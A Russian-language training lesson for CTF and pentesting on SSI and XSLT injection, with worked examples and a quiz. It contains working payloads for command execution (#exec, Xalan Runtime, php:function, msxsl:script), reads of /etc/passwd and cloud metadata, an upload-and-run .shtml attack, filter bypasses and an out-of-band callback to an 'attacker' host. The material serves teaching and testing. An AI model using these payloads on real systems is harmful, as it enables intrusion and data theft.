---
id: web-ssi-xslt-injection
title: "SSI- и XSLT-инъекции: парсеры за пределами шаблонов"
category: web
parent: web-ssti-core
difficulty: hard
order: 1
tags: [ssi, xslt, injection, xml, rce]
prerequisites: [web-ssti, web-xxe]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Server-Side Includes и XSLT-инъекции: выполнение директив и трансформаций, чтение файлов, SSRF и RCE."
---
SSI (Server Side Includes) и XSLT — это «парсеры за пределами шаблонизаторов»: языки, встроенные в веб-сервер (SSI) или в обработку XML (XSLT). Они редко попадают в поле зрения пентестера, но дают полноценный RCE, потому что по дизайну умеют выполнять команды и читать файлы. Если пользовательский ввод доходит до SSI-обработчика или до XSLT-трансформации, защита обычно уже не помогает — это не «инъекция в SQL», а прямое исполнение возможностей движка.

## Теория: что такое SSI

SSI — набор директив, которые веб-сервер (Apache, nginx с модулем, IIS) выполняет прямо в HTML перед отдачей. Файлы с расширением `.shtml`/`.stm`/`.shtm` обрабатываются SSI по умолчанию. Директивы имеют вид HTML-комментариев:

```html
<!--#echo var="DATE_LOCAL" -->
<!--#include virtual="/header.html" -->
<!--#exec cmd="id" -->
```

Ключевая директива — `#exec`, она выполняет команду и вставляет её вывод. Именно она превращает SSI в RCE. `#include` даёт LFI/SSRF (можно включить локальный файл или URL).

## Синтаксис и вариации

| Директива | Действие |
|-----------|----------|
| `#echo` | вывести переменную (`DATE_LOCAL`, `QUERY_STRING`) |
| `#include` | включить файл/URL |
| `#exec cmd=` | выполнить shell-команду |
| `#exec cgi=` | выполнить CGI-скрипт |
| `#config` | изменить настройки вывода |
| `#fsize`/`#flastmod` | размер/дата файла |

Разные серверы поддерживают разный набор; Apache требует `Options +Includes` (а для `#exec` — ещё и разрешения). Признак SSI-обработки: расширение `.shtml`, заголовок `Server: Apache` и наличие `<!--#` в исходниках.

## Разобранный пример: SSI → RCE через загрузку .shtml

Дано: приложение разрешает загрузку файлов и отдаёт их из webroot; SSI включён.

```bash
# 1. создаём вредоносный .shtml
cat > evil.shtml <<'EOF'
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
EOF
# 2. загружаем
curl -s -F 'file=@evil.shtml;type=text/html' https://app.example/upload
# 3. открываем загруженный файл
curl -s https://app.example/uploads/evil.shtml
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Если фильтр расширений не пропускает `.shtml`, попробуйте `.stm`, `.shtm` или загрузку в директорию, где SSI включён по `AddOutputFilter INCLUDES .html`.

## Теория: XSLT как язык трансформации

XSLT (eXtensible Stylesheet Language Transformations) — язык преобразования XML в XML/HTML/текст. Приложение принимает XML + XSLT и делает `transform`. XSLT — **полноценный язык** с функциями; некоторые процессоры позволяют вызывать расширения (Java, .NET, PHP), что даёт RCE.

Точки XSLT-инъекции:

- пользователь загружает XSLT-файл (или «шаблон отчёта»);
- XSLT генерируется из пользовательского ввода;
- приложение принимает XML с `<?xml-stylesheet?>`-инструкцией;
- SOAP/WS-Security, где XSLT применяется к сообщениям.

## XSLT: чтение файлов и SSRF

Даже без расширений XSLT умеет читать файлы и делать сетевые запросы через `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out><xsl:value-of select="document('/etc/passwd')"/></out>
    <out><xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/></out>
  </xsl:template>
</xsl:stylesheet>
```

`document()` — это LFI и SSRF одновременно: можно прочитать файл или обратиться к внутреннему сервису/метаданным облака.

## Разобранный пример: XSLT → RCE (Java-расширения)

Java-процессоры (Xalan, Saxon) позволяют вызывать Java-методы через namespace-расширения:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
  exclude-result-prefixes="rt ob">
  <xsl:template match="/">
    <xsl:variable name="rtobj" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rtobj,'id')"/>
    <xsl:value-of select="ob:toString($proc)"/>
  </xsl:template>
</xsl:stylesheet>
```

Если процессор разрешает расширения (по умолчанию в Xalan — да), это полноценный RCE. Защита — `FEATURE_SECURE_PROCESSING` и запрет расширений.

## Разобранный пример: XSLT через загрузку XML

Дано: приложение принимает XML «отчёта» и применяет к нему XSLT из того же файла.

```bash
curl -s -X POST https://app.example/report \
  -H 'Content-Type: application/xml' \
  --data-binary @evil.xsl
# evil.xsl — это XSLT из примера выше
```

Если в ответе виден вывод `id` или пришёл OOB-запрос — RCE подтверждён. Если ответ пустой — используйте OOB (`document('http://attacker/')`).

## PHP-специфика: XSLTProcessor и registerPHPFunctions

В PHP `XSLTProcessor::registerPHPFunctions()` позволяет XSLT вызывать PHP-функции:

```xml
<xsl:value-of select="php:function('system','id')"/>
```

Если функция зарегистрирована (а иногда регистрируют широко, включая `system`), это RCE. Точки: старые CMS, «генераторы PDF/отчётов», SOAP-обработчики.

## .NET-специфика: msxsl:script

В .NET XSLT можно встроить C#/VB-код через `<msxsl:script>`:

```xml
<msxsl:script language="C#" implements-prefix="user">
  public string Run(){ return System.Diagnostics.Process.Start("cmd","/c whoami").StandardOutput.ReadToEnd(); }
</msxsl:script>
```

Требует разрешения `EnableScript` — но в старых конфигурациях оно включено.

## Где искать

- Загрузка `.shtml`/`.stm`/`.shtm` или файлов, отдаваемых из SSI-директории.
- «Генератор отчётов»/«шаблон» с XSLT.
- Загрузка XML/XSLT/SVG (SVG может содержать XSLT).
- SOAP/WS-Security-обработка.
- Поля `xml=`, `xsl=`, `template=`, `transform=`, `stylesheet=`.

## Инструменты

- **Burp Repeater** — ручная доставка XML/XSLT.
- **`curl --data-binary @file`** — точная передача тела.
- **Collaborator/OOB-листенер** — подтверждение blind SSRF/RCE.
- **`xsltproc`** локально — проверка payload до доставки:

```bash
xsltproc evil.xsl input.xml
```

## Обходы фильтров

- **`<!DOCTYPE` запрещён** — используйте XInclude или внешний XSLT.
- **`document()` запрещён** — попробуйте `xsl:include`/`xsl:import` с URL.
- **Расширения запрещены** — вернитесь к чтению файлов/SSRF (тоже ценно).
- **Фильтр по `.shtml`** — `.stm`, `.shtm`, обход регистром (`.SHTML`).
- **WAF по `<script`** — SSI-директивы выглядят как комментарии, часто проходят.

## Что дальше / decision

1. Нашли обработку SSI (`<!--#`) → попробуйте `#exec cmd=`.
2. Нашли XSLT-точку → сначала `document()` (LFI/SSRF), затем расширения (RCE).
3. Java → `Runtime`; .NET → `msxsl:script`; PHP → `php:function`.
4. Расширения запрещены → докажите LFI/SSRF через `document()`.
5. RCE подтверждён → устойчивый канал + read-back.
6. Тупик → смежные темы (`web-xxe`, `web-ssrf-core`).

## Частые ошибки

- **Искать только шаблонизаторы.** SSI/XSLT — отдельный класс.
- **Забыть про расширения.** «Безопасный» XSLT всё равно читает файлы.
- **Не проверить `.stm`/`.shtm`.** Чёрный список по `.shtml` неполон.
- **Ждать вывода.** Используйте OOB.
- **Путать XSLT и XPath-инъекцию.** Разные механизмы (`web-xpath-injection`).

## Справочная таблица

| Механизм | Примитив | Payload |
|----------|----------|---------|
| SSI exec | RCE | `<!--#exec cmd="id" -->` |
| SSI include | LFI/SSRF | `<!--#include virtual="/etc/passwd" -->` |
| XSLT document() | LFI/SSRF | `document('/etc/passwd')` |
| XSLT Java ext | RCE | `rt:exec(rt:getRuntime(),'id')` |
| XSLT PHP fn | RCE | `php:function('system','id')` |
| .NET msxsl | RCE | `<msxsl:script>` |
## Практический чек-лист и разбор CTF-кейса

Представьте CTF-задачу: есть форма «импорта данных» с загрузкой файла, которая принимает `.xml`, `.svg` и `.xsl`, а сервер показывает «предпросмотр». Первый шаг — понять, что именно обрабатывается. Загрузите обычный XML и посмотрите, как меняется ответ: если сервер применяет XSLT, он отразит трансформированный результат; если включён SSI, директивы выполнятся.

Порядок действий:

1. **Определите движок.** Загрузите файл с безобидной SSI-директивой `<!--#echo var="DATE_LOCAL" -->`. Если в предпросмотре появилась дата — SSI активен. Аналогично для XSLT: загрузите тривиальный XSLT и проверьте, что результат трансформации виден.
2. **Проверьте `#exec`.** В SSI-контексте подайте `<!--#exec cmd="id" -->`. Если SSI-обработка включена и `#exec` разрешён, вы сразу получите RCE. Если `#exec` запрещён, но `#include` работает — читайте локальные файлы: `<!--#include virtual="/etc/passwd" -->`.
3. **Проверьте XSLT `document()`.** Даже «безопасный» XSLT (без расширений) читает файлы: `<xsl:value-of select="document('/etc/passwd')"/>`. Это даёт LFI, а `document('http://127.0.0.1:6379/')` — SSRF.
4. **Попробуйте расширения.** Для Java-процессора — namespace `xalan/java`; для .NET — `msxsl:script`; для PHP — `php:function`. Если расширения разрешены, это RCE.
5. **Обойдите фильтры.** Если `.shtml` запрещён — `.stm`/`.shtm`; если `<!DOCTYPE` запрещён — XInclude; если `document()` заблокирован — `xsl:include` с URL.
6. **Подтвердите артефактом.** Для RCE — вывод `id` или OOB-запрос; для LFI — содержимое файла.

Важный момент: SSI и XSLT почти никогда не детектируются сканерами. Их находят только по «странным» форматам загрузки и по обработке XML/XSL. Поэтому в чек-листе рекогносцировки держите отдельный пункт: «есть ли загрузка XML/SVG/XSL/SHTML и есть ли генератор отчётов».

## Сравнение SSI и XSLT

| Критерий | SSI | XSLT |
|----------|-----|------|
| Где живёт | веб-сервер (Apache/nginx/IIS) | XML-процессор (приложение) |
| Признак | расширение `.shtml`, `<!--#` | обработка `.xsl`/XML-шаблонов |
| RCE | `#exec cmd=` | расширения (Java/.NET/PHP) |
| LFI | `#include virtual=` | `document()` |
| Обход | смена расширения | XInclude, external DTD |
| Типичная точка | загрузка файлов | генератор отчётов, SOAP |

Держите обе техники в одном чек-листе: часто приложение, уязвимое к SSI, уязвимо и к XSLT, потому что обе поверхности связаны с обработкой пользовательских файлов.
## Разобранный пример: XSLT через SOAP/WS-Security

Многие SOAP-стеки применяют XSLT к входящим сообщениям (для трансформации WS-Security-заголовков). Если XSLT управляется атакующим (например, через параметр `xslt=` или через вложенный `<xsl:stylesheet>`), это прямой путь к RCE. Проверка:

```bash
curl -s -X POST https://app.example/soap \
  -H 'Content-Type: text/xml' \
  --data-binary @soap-xslt.xml
```

где `soap-xslt.xml` содержит вложенный XSLT с `document()` или Java-расширением. Даже если сам SOAP-эндпоинт защищён WAF, XSLT внутри тела часто не инспектируется, потому что WAF ищет SQLi/XSS, а не `xsl:value-of`.

## Разобранный пример: SSI через LFI

Если у приложения есть LFI, а сервер поддерживает SSI, можно комбинировать: сначала записать `.shtml` через LFI/log-poisoning, затем открыть его. Другой вариант — `#include` в существующем `.shtml`-файле, куда попадает пользовательский ввод (например, имя пользователя на странице профиля). Проверка:

```bash
# если страница .shtml включает поле, которое мы контролируем
curl -s 'https://app.example/profile?name=<!--%23exec%20cmd="id"-->'
```

Если SSI-обработка включена для `.shtml` и поле не экранируется, команда выполнится при рендере страницы.

## Итог по SSI и XSLT

Оба механизма объединяет одна мысль: **обработчик вне шаблонизатора**. Разработчики ставят защиту в шаблонизаторе (экранирование), но забывают, что веб-сервер (SSI) и XML-процессор (XSLT) — это отдельные движки со своими возможностями. Поэтому в чек-листе рекогносцировки всегда отмечайте: есть ли загрузка/обработка `.shtml`, `.xsl`, `.xml`, SVG, SOAP. Если есть — вы почти наверняка найдёте либо LFI, либо SSRF, либо RCE.

## Квиз

```quiz
- question: "Что такое SSI?"
  options:
    - "SQL-инъекция"
    - "Директивы, исполняемые веб-сервером в HTML"
    - "Шаблон Jinja2"
    - "XML-формат"
  answer: 1
  explanation: "Server-Side Includes."
- question: "Какая директива SSI выполняет команду?"
  options:
    - "#include"
    - "#exec cmd="
    - "#echo"
    - "#set"
  answer: 1
  explanation: "#exec запускает команду/скрипт."
- question: "Какая XSLT-функция читает файл или делает SSRF?"
  options:
    - "load()"
    - "document()"
    - "read()"
    - "open()"
  answer: 1
  explanation: "document() загружает внешние ресурсы."
- question: "Что даёт msxsl:script в .NET XSLT?"
  options:
    - "Кеш"
    - "Выполнение C#/VB-кода (RCE)"
    - "Шифрование"
    - "Валидацию"
  answer: 1
  explanation: "Встроенный скрипт-блок."
- question: "Какой процессор Java позволяет вызвать Runtime через XSLT?"
  options:
    - "libxslt"
    - "Saxon (java:)"
    - "msxsl"
    - "lxml"
  answer: 1
  explanation: "Saxon поддерживает java: расширения."
```

## Где пригодится

- **CTF (Web):** задачи на SSI/XSLT.
- **Bug bounty:** XSLT RCE/SSRF — редкий критичный отчёт.
- **Пентест:** аудит экспорта/конвертации XML.
- **Работа (AppSec):** отключение SSI, sandbox XSLT, запрет document()/расширений.
